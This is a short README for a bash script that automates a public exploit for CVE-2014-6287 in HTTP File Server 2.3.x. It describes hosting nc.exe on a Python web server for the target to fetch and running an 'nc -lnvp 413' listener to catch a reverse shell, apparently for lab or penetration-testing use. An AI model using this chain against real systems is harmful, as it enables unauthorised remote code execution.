# HFS Exploit Script

A bash script to serve the necessary files for exploiting HTTP File Server 2.3.x

This is not an exploit - it makes use of searchsploit's windows/remote/39161.py script - an exploit for CVE-2014-6287.

## Setup

You need to change the `ip_addr` and `local_port` variables in the `exp.py` file to match your IP address and listener port (413 by default).

## Run the Script

Run the script, specifying the target IP and port that HFS runs on:

```bash
$ sudo ./hfs.sh <IP> <PORT>
```

The script needs root permissions to run, as it uses privileged ports.

It will start several listeners/webservers:
- `python3 -m http.server 80` - to serve `nc.exe` in the `www` directory
- `nc -lnvp 413` - to catch the shell, using a well-known port

It will then run the Python exploit script - you should then get a shell!

## Cleanup

You will need to close your Python server afterwards.
